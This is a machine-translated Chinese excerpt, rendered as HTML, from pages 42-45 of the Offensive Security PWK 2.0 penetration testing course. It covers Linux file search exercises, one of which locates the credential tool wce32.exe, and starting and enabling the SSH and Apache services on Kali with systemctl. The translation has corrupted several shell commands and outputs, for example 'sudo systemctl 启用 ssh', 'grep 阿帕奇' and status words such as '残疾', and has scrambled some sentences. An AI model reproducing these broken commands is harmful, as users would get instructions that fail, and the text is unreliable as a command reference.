<div style="position:absolute;top:49537;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/lib/dpkg/info/sbd.md5sums</font></font></nobr></div>
<div style="position:absolute;top:49554;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">/var/lib/dpkg/info/sbd.list</font></font></nobr></div>
<div style="position:absolute;top:49573;left:345"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 14 - 探索 find 命令</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49603;left:109"><nobr><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">优于</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">locate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">的主要优点</font><font style="vertical-align: inherit;">是它可以搜索文件和目录超过</font></font></nobr></div>
<div style="position:absolute;top:49622;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只是名字。</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">，我们可以按文件年龄、大小、所有者、文件类型、时间戳、权限进行搜索，</font></font></nobr></div>
<div style="position:absolute;top:49641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和更多。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:49676;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.4.3.4 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:49706;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查看您喜欢的命令之一的手册页。</font></font></nobr></div>
<div style="position:absolute;top:49734;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">man</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">查找与文件压缩相关的关键字。</font></font></nobr></div>
<div style="position:absolute;top:49763;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">which</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在您的 Kali 虚拟机上定位 pwd 命令。</font></font></nobr></div>
<div style="position:absolute;top:49791;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">4. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">locate</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在你的Kali虚拟机上定位wce32.exe。</font></font></nobr></div>
<div style="position:absolute;top:49820;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">5. 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">find</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来识别在最后一天修改的任何文件（不是目录），不属于 root</font></font></nobr></div>
<div style="position:absolute;top:49839;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">user 并对</font><font style="vertical-align: inherit;">它们</font><font style="vertical-align: inherit;">执行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ls -l</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">不允许链接/管道命令！</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:49903;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">40 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">(die.net, 2019), https://linux.die.net/man/1/locate</font></font></font></nobr></div>
<div style="position:absolute;top:49923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">41 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（die.net，2019），https://linux.die.net/man/1/find</font></font></font></nobr></div>
<div style="position:absolute;top:49943;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">42 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Stack Exchange，2015 年），https://unix.stackexchange.com/questions/60205/locate-vs-find-usage-pros-and-cons-of-each-other</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:50071;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="43"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 43 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:50104;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:51181;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:51181;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:51181;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50200;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5 管理 Kali Linux 服务</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50241;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 是一个专门针对安全专业人士的 Linux 发行版。</font><font style="vertical-align: inherit;">因此，它包含</font></font></nobr></div>
<div style="position:absolute;top:50261;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">几个非标准功能。</font><font style="vertical-align: inherit;">默认的 Kali 安装附带了几个预装的服务，</font></font></nobr></div>
<div style="position:absolute;top:50280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">例如 SSH、HTTP、MySQL 等。因此，这些服务将在启动时加载，这将</font></font></nobr></div>
<div style="position:absolute;top:50300;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">导致 Kali 默认暴露几个开放端口——为了安全，我们想避免这种情况</font></font></nobr></div>
<div style="position:absolute;top:50319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">原因。</font><font style="vertical-align: inherit;">Kali 通过更新其设置来防止网络服务启动来解决此问题</font></font></nobr></div>
<div style="position:absolute;top:50338;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在启动时。</font></font></nobr></div>
<div style="position:absolute;top:50371;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali 还包含将各种服务列入白名单和黑名单的机制。</font><font style="vertical-align: inherit;">以下</font></font></nobr></div>
<div style="position:absolute;top:50390;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">部分将讨论其中一些服务，以及如何操作和管理它们。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50425;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.1 SSH 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50463;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Secure SHell (SSH) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务最常用于远程访问计算机，使用</font></font></nobr></div>
<div style="position:absolute;top:50482;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">安全、加密的协议。</font><font style="vertical-align: inherit;">SSH 服务基于 TCP，默认情况下侦听端口 22。</font></font></nobr></div>
<div style="position:absolute;top:50501;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 中启动 SSH 服务，我们</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">start</font></font></b><font style="vertical-align: inherit;">选项后跟服务名称</font><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:50521;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（本例中的 ssh）：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50556;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl start ssh</font></font></font></b></nobr></div>
<div style="position:absolute;top:50572;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:50592;left:294"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 15 - 在 Kali 中使用 systemctl 启动 ssh 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50621;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">当命令成功完成时，它不会返回任何输出，但我们可以验证</font></font></nobr></div>
<div style="position:absolute;top:50641;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">SSH 服务正在运行并通过使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令并通过管道</font><font style="vertical-align: inherit;">传输 TCP 端口 22 来侦听</font></font></nobr></div>
<div style="position:absolute;top:50660;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">输出到</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">以搜索“sshd”的输出：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ss -antlp | </font><font style="vertical-align: inherit;">grep sshd</font></font></font></b></nobr></div>
<div style="position:absolute;top:50712;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 128 *:22    </font></font></nobr></div>
<div style="position:absolute;top:50712;left:425"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">*:* 用户:(("sshd",pid=1343,fd=3))</font></font></nobr></div>
<div style="position:absolute;top:50729;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">听 0 128 :::22 :::* 用户:(("sshd",pid=1343,fd=4))</font></font></nobr></div>
<div style="position:absolute;top:50748;left:226"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 16 - 使用 ss 和 grep 确认 ssh 已启动并正在运行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50778;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">如果我们希望在启动时自动启动 SSH 服务（许多用户喜欢），我们</font></font></nobr></div>
<div style="position:absolute;top:50797;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">只需使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令</font><font style="vertical-align: inherit;">启用它</font><font style="vertical-align: inherit;">。</font><font style="vertical-align: inherit;">不过一定要改默认密码</font></font></nobr></div>
<div style="position:absolute;top:50816;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第一的！</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:50851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl 启用 ssh</font></font></font></b></nobr></div>
<div style="position:absolute;top:50868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 /lib/systemd/systemd- 将 ssh.service 的状态与 SysV 服务脚本同步</font></font></nobr></div>
<div style="position:absolute;top:50885;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行：/lib/systemd/systemd-sysv-install 启用 ssh</font></font></nobr></div>
<div style="position:absolute;top:50902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">创建符号链接 /etc/systemd/system/sshd.service → /lib/systemd/system/ssh.service。</font></font></nobr></div>
<div style="position:absolute;top:50921;left:273"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 17 - 使用 systemctl 配置 ssh 在引导时启动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:50951;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们可以使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来启用和禁用 Kali Linux 中的大多数服务。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:50986;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.2 HTTP 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51023;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Apache HTTP 服务通常在渗透测试期间使用，用于托管站点，或</font></font></nobr></div>
<div style="position:absolute;top:51043;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">提供将文件下载到受害机器的平台。</font><font style="vertical-align: inherit;">HTTP 服务是基于 TCP 的，并且</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:51131;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">43 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（维基百科，2019 年），https://en.wikipedia.org/wiki/Secure_Shell</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:51259;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="44"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 44 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:51292;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:52369;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:52369;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:52369;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51388;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">默认监听 80 端口。要在 Kali 中启动 HTTP 服务，我们可以</font><font style="vertical-align: inherit;">像之前一样</font><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"></font></nobr></div>
<div style="position:absolute;top:51407;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动SSH服务时，将服务名称替换为“apache2”：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51442;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl start apache2</font></font></font></b></nobr></div>
<div style="position:absolute;top:51459;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$</font></font></nobr></div>
<div style="position:absolute;top:51478;left:283"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 18 - 在 Kali 中使用 systemctl 启动 apache 服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51508;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">与 SSH 服务一样，我们可以验证 HTTP 服务是否正在运行并侦听 TCP 端口</font></font></nobr></div>
<div style="position:absolute;top:51527;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80 使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ss</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">和</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">命令。</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51562;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo ss -antlp | </font><font style="vertical-align: inherit;">阿帕奇</font></font></font></b></nobr></div>
<div style="position:absolute;top:51579;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LISTEN 0 128 :::80 :::* users:(("apache2",pid=1481,fd=4),("apache2",pid=1481,fd=4),("apache2",pid=1481,fd=4),(</font></font></nobr></div>
<div style="position:absolute;top:51596;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">e2",pid=1480,fd=4),("apache2",pid=1479,fd=4),("apache2",pid=1478,fd=4),("apache2",pid=</font></font></nobr></div>
<div style="position:absolute;top:51613;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1477,fd=4),("apache2",pid=1476,fd=4),("apache2",pid=1475,fd=4))</font></font></nobr></div>
<div style="position:absolute;top:51632;left:215"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 19 - 使用 ss 和 grep 确认 apache 已启动并正在运行</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51661;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为了让 HTTP 服务在启动时启动，就像 SSH 服务一样，我们需要明确地</font></font></nobr></div>
<div style="position:absolute;top:51681;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">及其</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启用</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项</font><font style="vertical-align: inherit;">启用它</font><font style="vertical-align: inherit;">：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51716;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo systemctl 启用 apache2</font></font></font></b></nobr></div>
<div style="position:absolute;top:51733;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 /lib/systemd/syst 同步 apache2.service 和 SysV 服务脚本的状态</font></font></nobr></div>
<div style="position:absolute;top:51750;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">执行：/lib/systemd/systemd-sysv-install enable apache2</font></font></nobr></div>
<div style="position:absolute;top:51769;left:270"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 20 - 使用 systemctl 使 apache 在引导时启动</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:51799;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">Kali Linux 中的大多数服务的运行方式与 SSH 和 HTTP 大致相同，通过它们的</font></font></nobr></div>
<div style="position:absolute;top:51818;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">服务或初始化脚本。</font><font style="vertical-align: inherit;">要查看所有可用服务的表，请</font><font style="vertical-align: inherit;">使用</font><b><font style="font-size:13px"><font style="vertical-align: inherit;">list-unit-</font></font></b><font style="vertical-align: inherit;">运行</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl-</font></font></font></b><font style="vertical-align: inherit;"></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"></font></font></b></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:13px;font-family:Times">
<div style="position:absolute;top:51838;left:109"><nobr><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文件</font></font></b><font style="font-size:14px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">选项：</font></font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:51872;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl list-unit-files</font></font></font></b></nobr></div>
<div style="position:absolute;top:51889;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:51906;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">单元文件    </font></font></nobr></div>
<div style="position:absolute;top:51906;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态    </font></font></nobr></div>
<div style="position:absolute;top:51923;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proc-sys-fs-binfmt_misc.automount    </font></font></nobr></div>
<div style="position:absolute;top:51923;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:51940;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">-。山    </font></font></nobr></div>
<div style="position:absolute;top:51940;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成    </font></font></nobr></div>
<div style="position:absolute;top:51957;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dev-hugepages.mount    </font></font></nobr></div>
<div style="position:absolute;top:51957;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:51974;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">dev-mqueue.mount    </font></font></nobr></div>
<div style="position:absolute;top:51974;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:51991;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">媒体-cdrom0.mount    </font></font></nobr></div>
<div style="position:absolute;top:51991;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">生成    </font></font></nobr></div>
<div style="position:absolute;top:52008;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">proc-sys-fs-binfmt_misc.mount    </font></font></nobr></div>
<div style="position:absolute;top:52008;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:52025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">运行 vmblock\x2dfuse.mount    </font></font></nobr></div>
<div style="position:absolute;top:52025;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">残疾    </font></font></nobr></div>
<div style="position:absolute;top:52042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys-fs-fuse-connections.mount    </font></font></nobr></div>
<div style="position:absolute;top:52042;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:52059;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys-kernel-config.mount    </font></font></nobr></div>
<div style="position:absolute;top:52059;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的    </font></font></nobr></div>
<div style="position:absolute;top:52076;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sys-kernel-debug.mount    </font></font></nobr></div>
<div style="position:absolute;top:52076;left:635"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">静止的</font></font></nobr></div>
<div style="position:absolute;top:52093;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:52112;left:336"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 21 - 显示所有可用的服务</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52142;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">有关 Kali Linux 中服务管理的更多信息，包括使用</font></font></nobr></div>
<div style="position:absolute;top:52161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">systemctl，请参阅 Kali 培训站点。</font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44</font></font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:18px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:52196;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2.5.3 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:52234;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（这些练习不需要报告）</font></font></i></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:52319;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">44 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（进攻性安全，2019 年），https://kali.training/topic/managing-services/</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:52447;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="45"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 45 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:52480;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:53557;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:53557;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:53557;left:798"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">45</font></font></nobr></div>
</span></font>
